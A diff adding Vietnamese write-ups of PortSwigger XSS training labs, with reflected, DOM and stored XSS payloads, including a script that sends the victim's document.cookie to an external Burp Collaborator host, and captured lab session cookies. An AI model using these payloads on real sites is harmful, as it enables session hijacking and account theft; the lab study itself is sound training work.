@@ -622,6 +622,91 @@ To solve this lab, perform a cross-site scripting attack that calls the alert fu
 Ta thấy source là search và sink ở đây là document.write, để xss thì chỉ cần "> để đóng <img lại và ta sẽ truyền script vào để thực thi:
                                                                                              
 ```                                                                                          
-"><script>alert(1)</script>                         
+"><script>alert(1)</script> 
+or
+"><imng src=x onerror=alert(1)>
   
 ```
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/c9834840-1331-41f8-811e-981b055e8468)
+
+  
+## [Lab: DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
+  
+```
+This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.
+
+To solve this lab, perform a cross-site scripting attack that calls the alert function.
+
+```
+
+Kiểm tra source code, bài này source là search và sink là innerHTML: 
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/710033ed-2caa-4992-8ff3-b40d24c33d09)
+
+Thuộc tính innerHTML ở đây block tag script nên ta có thể dùng svg hoặc img thay thế, ta alert với payload sau: 
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/5b681ef3-b9bd-4bdf-981f-ae3ea2f6d7bd)
+
+## [Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
+  
+```
+This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function
+
+```
+  
+Bài không có gì đặc biệt ngoài phần check sản phẩm: 
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/884ce86a-3da3-4b07-830c-ecf24632e0a3)
+
+Đoạn code xử lí bên client như sau:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/bea8dc71-a4d8-47e9-8edd-489c3e6ebc34)
+
+Ở đây source sẽ là storeId còn sink sẽ là document.write:
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/dbd17995-f6ca-47d7-a4e4-7e0ebac643e2)
+
+Ta sẽ truyền thêm tham số storeId và payload là :
+
+```  
+?productId=1&storeId=</option><script>alert(1)</script>
+
+```
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/555669c4-53c7-480f-b9b5-8701f8c1a13c)
+  
+ 
+## [Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+  
+```
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.  
+  
+```
+  
+Bài dính stored xss ở trường comment:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/74c2853d-c66b-4b58-8089-5a44fb3b27ec)
+
+Dạng xss cơ bản, ta viết script để lấy cookie của admin, bài bắt ta dùng đường dẫn của burp collaborator nên chỉ cần thay là exploit được:
+  
+Payload:
+  
+```
+<script>location="https://299r9orvweuzapadw565dsszfqlh97xw.oastify.com?c="+document.cookie</script>
+
+```
+Gửi và check reqest to Collaborator:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/33c1a03d-55f2-45ca-8807-1e4229108aa7)
+
+Thay Cookie: secret=oC7nJlSFHpTwVIkVUVqiXyMFtxnsr5Sc; session=e4agwjYbiUTab4mHCsyAhM4PEjbbwWNH tương ứng ta được: 
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/cc043094-2cec-4ab5-a785-2a230b0640a6)
+
+
+## [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
+  
+  
+  
